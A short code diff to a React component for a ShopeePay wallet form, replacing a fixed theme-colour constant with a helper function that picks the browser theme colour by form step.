@@ -8,7 +8,7 @@ import { useStepPanelReady } from '../hooks/useStepPanelReady';
 import { formatPhoneInput, otpIsValid } from '../lib/utils';
 import type { WalletFormProps } from './wallet-methods';
 import { ThemeColorMeta } from '../ThemeColorMeta';
-import { WALLET_THEME } from '../lib/theme-colors';
+import { getWalletFormThemeColor } from '../lib/theme-colors';
 import { ShopeepayLoadingSpinnerOverlay } from './ShopeepayLoadingSpinnerOverlay';
 import './shopeepay-wallet.css';
 
@@ -130,7 +130,7 @@ export function ShopeepayWalletForm({ slugData, onBack }: WalletFormProps) {
 
   return (
     <div className="spay-flow">
-      <ThemeColorMeta color={WALLET_THEME.shopeepay} />
+      <ThemeColorMeta color={getWalletFormThemeColor('shopeepay', { step: f.step })} />
       <ShopeepayLoadingSpinnerOverlay visible={f.isLoadingOverlay} />
       {(f.step === 1 || f.previousStep === 1) && (
         <div className={`spay-step1 ${stepPanelClass(f.isStep1FadingOut)}`}>
